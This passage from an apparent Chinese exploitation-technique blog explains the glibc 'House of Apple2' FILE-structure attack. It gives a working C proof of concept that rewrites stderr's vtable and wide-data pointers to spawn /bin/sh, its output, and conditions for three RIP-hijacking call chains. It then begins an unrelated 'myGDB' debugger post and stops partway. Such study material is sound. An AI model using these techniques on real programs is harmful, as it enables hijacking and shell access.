&#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===========================new value=======================&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>结果：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> ./test</span><br><span class="line">[*] allocate a <span class="number">0x100</span> chunk</span><br><span class="line">===========================old value=======================</span><br><span class="line">[<span class="number">0x55a85a8bc2a0</span>]: <span class="number">0x1122334455667788</span>  <span class="number">0x1122334455667788</span></span><br><span class="line">[<span class="number">0x55a85a8bc2b0</span>]: <span class="number">0x1122334455667788</span>  <span class="number">0x1122334455667788</span></span><br><span class="line">[<span class="number">0x55a85a8bc2c0</span>]: <span class="number">0x1122334455667788</span>  <span class="number">0x1122334455667788</span></span><br><span class="line">[<span class="number">0x55a85a8bc2d0</span>]: <span class="number">0x1122334455667788</span>  <span class="number">0x1122334455667788</span></span><br><span class="line">===========================old value=======================</span><br><span class="line">[*] <span class="built_in">puts</span> address: <span class="number">0x7f6c95c1c420</span></span><br><span class="line">[*] <span class="built_in">stderr</span>-&gt;_IO_write_ptr address: <span class="number">0x7f6c95d855e8</span></span><br><span class="line">[*] <span class="built_in">stderr</span>-&gt;_flags2 address: <span class="number">0x7f6c95d85634</span></span><br><span class="line">[*] <span class="built_in">stderr</span>-&gt;_wide_data address: <span class="number">0x7f6c95d85660</span></span><br><span class="line">[*] <span class="built_in">stderr</span>-&gt;vtable address: <span class="number">0x7f6c95d85698</span></span><br><span class="line">[*] _IO_wstrn_jumps address: <span class="number">0x7f6c95d80c60</span></span><br><span class="line">[+] step <span class="number">1</span>: change <span class="built_in">stderr</span>-&gt;_IO_write_ptr to <span class="number">-1</span></span><br><span class="line">[+] step <span class="number">2</span>: change <span class="built_in">stderr</span>-&gt;_flags2 to <span class="number">8</span></span><br><span class="line">[+] step <span class="number">3</span>: replace <span class="built_in">stderr</span>-&gt;_wide_data with the allocated chunk</span><br><span class="line">[+] step <span class="number">4</span>: replace <span class="built_in">stderr</span>-&gt;vtable with _IO_wstrn_jumps</span><br><span class="line">[+] step <span class="number">5</span>: call fcloseall <span class="keyword">and</span> trigger house of apple</span><br><span class="line">===========================<span class="keyword">new</span> value=======================</span><br><span class="line">[<span class="number">0x55a85a8bc2a0</span>]: <span class="number">0x00007f6c95d856b0</span>  <span class="number">0x00007f6c95d857b0</span></span><br><span class="line">[<span class="number">0x55a85a8bc2b0</span>]: <span class="number">0x00007f6c95d856b0</span>  <span class="number">0x00007f6c95d856b0</span></span><br><span class="line">[<span class="number">0x55a85a8bc2c0</span>]: <span class="number">0x00007f6c95d856b0</span>  <span class="number">0x00007f6c95d856b0</span></span><br><span class="line">[<span class="number">0x55a85a8bc2d0</span>]: <span class="number">0x00007f6c95d856b0</span>  <span class="number">0x00007f6c95d857b0</span></span><br><span class="line">===========================<span class="keyword">new</span> value=======================</span><br></pre></td></tr></table></figure>
<ul>
<li>成功对堆上的数据进行了修改</li>
</ul>
<p>上面这种用法只能实现已知地址任意写（和 largebin attack 的效果类似），下面这种利用方式可以直接劫持程序流程（称为 house of apple2）</p>
<h2 id="House-Of-Apple2-原理"><a href="#House-Of-Apple2-原理" class="headerlink" title="House Of Apple2 原理"></a>House Of Apple2 原理</h2><p><code>stdin/stdout/stderr</code> 这三个 <code>_IO_FILE</code> 结构体会以 <code>_IO_file_jumps</code> 为虚表，而其中的函数 <code>IO_validate_vtable</code> 负责检查 <code>vtable</code> 的合法性</p>
<p>但在调用虚表 <code>_wide_vtable</code> 里面的函数时，并没有检查 <code>vtable</code> 的合法性</p>
<p>因此，我们可以劫持 <code>IO_FILE</code> 的 <code>vtable</code> 为 <code>_IO_wfile_jumps</code>，控制 <code>_wide_data</code> 为可控的堆地址空间，进而控制 <code>_wide_data-&gt;_wide_vtable</code> 为可控的堆地址空间，然后控制程序的执行流：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_wdefault_xsgetn -&gt; _IO_switch_to_wget_mode -&gt; backdoor</span><br></pre></td></tr></table></figure>
<h2 id="House-Of-Apple2-利用姿势"><a href="#House-Of-Apple2-利用姿势" class="headerlink" title="House Of Apple2 利用姿势"></a>House Of Apple2 利用姿势</h2><p>使用 house of apple2 的条件为：</p>
<ul>
<li>能泄露出 <code>libc_base</code> 地址和 <code>heap_base</code> 地址 </li>
<li>能控制程序执行<code>IO</code>操作：<ul>
<li>从 <code>main</code> 函数返回</li>
<li>调用 <code>exit</code> 函数</li>
<li>通过 <code>__malloc_assert</code> 触发</li>
</ul>
</li>
<li>能控制 <code>_IO_FILE</code> 的 <code>vtable</code> 和 <code>_wide_data</code>（一般使用 <code>largebin attack</code>去控制）</li>
</ul>
<p>使用案例如下：（使用 <code>_IO_wdefault_xsgetn</code> 调用链）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">char</span> *p1 = <span class="built_in">calloc</span>(<span class="number">0x200</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">char</span> *p2 = <span class="built_in">calloc</span>(<span class="number">0x200</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] allocate two 0x200 chunks&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">size_t</span> puts_addr = (<span class="keyword">size_t</span>)&amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] puts address: %p\n&quot;</span>, (<span class="keyword">void</span> *)puts_addr);</span><br><span class="line">    <span class="keyword">size_t</span> libc_base_addr = puts_addr - <span class="number">0x84420</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] libc base address: %p\n&quot;</span>, (<span class="keyword">void</span> *)libc_base_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">size_t</span> _IO_2_1_stderr_addr = libc_base_addr + <span class="number">0x1ed5c0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_2_1_stderr_ address: %p\n&quot;</span>, (<span class="keyword">void</span> *)_IO_2_1_stderr_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">size_t</span> _IO_wstrn_jumps_addr = libc_base_addr + <span class="number">0x1e8c60</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_wstrn_jumps address: %p\n&quot;</span>, (<span class="keyword">void</span> *)_IO_wstrn_jumps_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">char</span> *stderr2 = (<span class="keyword">char</span> *)_IO_2_1_stderr_addr;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 1: change stderr-&gt;_flags to 0x800&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)stderr2 = <span class="number">0x800</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 2: change stderr-&gt;_mode to 1&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(stderr2 + <span class="number">0xc0</span>) = <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 3: change stderr-&gt;vtable to _IO_wstrn_jumps-0x20&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(stderr2 + <span class="number">0xd8</span>) = _IO_wstrn_jumps_addr<span class="number">-0x20</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 4: replace stderr-&gt;_wide_data with the allocated chunk p1&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(stderr2 + <span class="number">0xa0</span>) = (<span class="keyword">size_t</span>)p1;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 5: set stderr-&gt;_wide_data-&gt;_wide_vtable with the allocated chunk p2&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(p1 + <span class="number">0xe0</span>) = (<span class="keyword">size_t</span>)p2;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 6: set stderr-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_ptr &gt;  stderr-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_base&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(p1 + <span class="number">0x20</span>) = (<span class="keyword">size_t</span>)<span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 7: put backdoor at fake _wide_vtable-&gt;_overflow&quot;</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(p2 + <span class="number">0x18</span>) = (<span class="keyword">size_t</span>)(&amp;backdoor);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 8: call fflush(stderr) to trigger backdoor func&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stderr</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>结果：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> ./test </span><br><span class="line">[*] allocate two <span class="number">0x200</span> chunks</span><br><span class="line">[*] <span class="built_in">puts</span> address: <span class="number">0x7fe29386f420</span></span><br><span class="line">[*] libc base address: <span class="number">0x7fe2937eb000</span></span><br><span class="line">[*] _IO_2_1_stderr_ address: <span class="number">0x7fe2939d85c0</span></span><br><span class="line">[*] _IO_wstrn_jumps address: <span class="number">0x7fe2939d3c60</span></span><br><span class="line">[+] step <span class="number">1</span>: change <span class="built_in">stderr</span>-&gt;_flags to <span class="number">0x800</span></span><br><span class="line">[+] step <span class="number">2</span>: change <span class="built_in">stderr</span>-&gt;_mode to <span class="number">1</span></span><br><span class="line">[+] step <span class="number">3</span>: change <span class="built_in">stderr</span>-&gt;vtable to _IO_wstrn_jumps<span class="number">-0x20</span></span><br><span class="line">[+] step <span class="number">4</span>: replace <span class="built_in">stderr</span>-&gt;_wide_data with the allocated chunk p1</span><br><span class="line">[+] step <span class="number">5</span>: <span class="built_in">set</span> <span class="built_in">stderr</span>-&gt;_wide_data-&gt;_wide_vtable with the allocated chunk p2</span><br><span class="line">[+] step <span class="number">6</span>: <span class="built_in">set</span> <span class="built_in">stderr</span>-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_ptr &gt;  <span class="built_in">stderr</span>-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_base</span><br><span class="line">[+] step <span class="number">7</span>: put backdoor at fake _wide_vtable-&gt;_overflow</span><br><span class="line">[+] step <span class="number">8</span>: <span class="function">call <span class="title">fflush</span><span class="params">(<span class="built_in">stderr</span>)</span> to trigger backdoor func</span></span><br><span class="line"><span class="function">$ whoami</span></span><br><span class="line"><span class="function">yhellow</span></span><br></pre></td></tr></table></figure>
<p>下面给出几条好用的调用链及其利用方式：</p>
<p>利用 <code>_IO_wfile_overflow</code> 函数控制程序执行流</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_overflow -&gt; _IO_wdoallocbuf -&gt; _IO_WDOALLOCATE -&gt; *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x68</span>)(fp)</span><br></pre></td></tr></table></figure>
<ul>
<li><code>_flags</code> = <code>~(2 | 0x8 | 0x800)</code></li>
<li><code>vtable</code> = <code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code> 的地址（加减偏移）</li>
<li><code>_wide_data</code> = 可控堆地址<code>A</code>（即满足 <code>*(fp+0xa0)=A</code>）</li>
<li><code>_wide_data-&gt;_IO_write_base</code> = <code>0</code>（即满足 <code>*(A+0x18)=0</code>）</li>
<li><code>_wide_data-&gt;_IO_buf_base</code> = <code>0</code>（即满足 <code>*(A+0x30)=0</code>）</li>
<li><code>_wide_data-&gt;_wide_vtable</code> = 可控堆地址<code>B</code>（即满足 <code>*(A+0xe0)=B</code>）</li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code> = 地址<code>C</code>，用于劫持 <code>RIP</code>（即满足 <code>*(B+0x68)=C</code>）</li>
</ul>
<p>利用 <code>_IO_wfile_underflow_mmap</code> 函数控制程序执行流</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_underflow_mmap -&gt; _IO_wdoallocbuf -&gt; _IO_WDOALLOCATE -&gt; *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x68</span>)(fp)</span><br></pre></td></tr></table></figure>
<ul>
<li><code>_flags</code> = <code>~4</code></li>
<li><code>vtable</code> 设置为 <code>_IO_wfile_jumps_mmap</code> 地址（加减偏移）</li>
<li><code>_IO_read_end &gt; _IO_read_ptr</code>（不进入调用）</li>
<li><code>_wide_data</code> 设置为可控堆地址 <code>A</code>（即满足<code>*(fp+0xa0)=A</code>）</li>
<li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>（即满足<code>*A&gt;=*(A+8)</code>）</li>
<li><code>_wide_data-&gt;_IO_buf_base</code> = <code>0</code>（即满足<code>*(A+0x30)=0</code>）</li>
<li><code>_wide_data-&gt;_IO_save_base</code> = <code>0</code>（即满足<code>*(A+0x40)=0</code>）</li>
<li><code>_wide_data-&gt;_wide_vtable</code> = 可控堆地址<code>B</code>（即满足<code>*(A+0xe0)=B</code>）</li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code> = 地址<code>C</code>，用于劫持 <code>RIP</code>（即满足<code>*(B+0x68)=C</code>）</li>
<li>PS：这条链执行的条件是调用到 <code>_IO_wdefault_xsgetn</code> 时 <code>RDX</code> 寄存器不能为“0”</li>
</ul>
<p>利用 <code>_IO_wdefault_xsgetn</code> 函数控制程序执行流</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_wdefault_xsgetn -&gt; __wunderflow -&gt; _IO_switch_to_wget_mode -&gt; _IO_WOVERFLOW -&gt; *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x18</span>)(fp)</span><br></pre></td></tr></table></figure>
<ul>
<li><code>_flags</code> = <code>0x800</code></li>
<li><code>vtable</code> = <code>_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps</code> 地址（加减偏移）</li>
<li><code>_mode</code> &gt; <code>0</code>（即满足<code>*(fp+0xc0)&gt;0</code>）</li>
<li><code>_wide_data</code> = 可控堆地址<code>A</code>（即满足<code>*(fp+0xa0)=A</code>）</li>
<li><code>_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr</code> = <code>0</code>（即满足 <code>*(A+8)=*A</code>）</li>
<li><code>_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</code>（即满足<code>*(A+0x20)&gt;*(A+0x18)</code>）</li>
<li><code>_wide_data-&gt;_wide_vtable</code> = 可控堆地址<code>B</code>（即满足<code>*(A+0xe0)=B</code>）</li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;overflow</code> = 地址<code>C</code>，用于劫持<code>RIP</code>（即满足<code>*(B+0x18)=C</code>）</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/05/myGDB/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/05/myGDB/" class="post-title-link" itemprop="url">myGDB</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-11-05 00:11:46 / Modified: 00:14:00" itemprop="dateCreated datePublished" datetime="2022-11-05T00:11:46+08:00">2022-11-05</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Technology/" itemprop="url" rel="index"><span itemprop="name">Technology</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>9.7k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>9 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>简单GDB</strong></p>
<p>之前学习了 ptrace 系统调用，看了别人写的各种 demo 和简单调试器</p>
<p>我想自己尝试写一个简单的 GDB</p>
<p>目前实现的功能如下：</p>
<ul>
<li>单步执行（步入）</li>
<li>显示寄存器</li>
<li>显示内存</li>
<li>打断点</li>
<li>显示断点</li>
</ul>
<p>代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span 